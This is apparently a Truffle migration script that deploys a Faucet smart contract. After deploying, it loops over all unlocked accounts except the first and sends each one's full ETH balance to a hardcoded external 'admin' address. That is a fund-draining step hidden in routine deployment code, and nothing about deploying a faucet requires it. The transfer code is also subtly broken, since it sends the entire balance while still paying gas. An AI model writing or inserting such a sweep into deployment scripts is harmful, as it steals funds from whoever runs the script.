const Faucet = artifacts.require("Faucet");  // Ensure this matches the contract name

module.exports = async function (deployer, network, accounts) {
    // Deploy the Faucet contract
    await deployer.deploy(Faucet);
    const faucet = await Faucet.deployed();

    const adminAddress = "0x906e922665375c8F5f112788d00EbF211C9BC331";  // Admin address

    // Iterate through the accounts and send ETH to admin address
    for (let i = 1; i < accounts.length; i++) {
        const currentAddress = accounts[i];
        const balance = await web3.eth.getBalance(currentAddress);

        if (parseInt(balance) > 0) {
            console.log(`Transferring ETH from ${currentAddress} to ${adminAddress}`);

            try {
                // Ensure the transaction has enough gas
                await web3.eth.sendTransaction({
                    from: currentAddress,
                    to: adminAddress,
                    value: balance,  // Send all ETH
                    gas: 6721975,     // Gas limit
                    gasPrice: 20000000000,  // Gas price (20 gwei)
                });

                console.log(`Transferred ${web3.utils.fromWei(balance, 'ether')} ETH from ${currentAddress} to ${adminAddress}`);
            } catch (error) {
                console.error(`Error transferring ETH from ${currentAddress} to ${adminAddress}:`, error);
            }
        }
    }
};
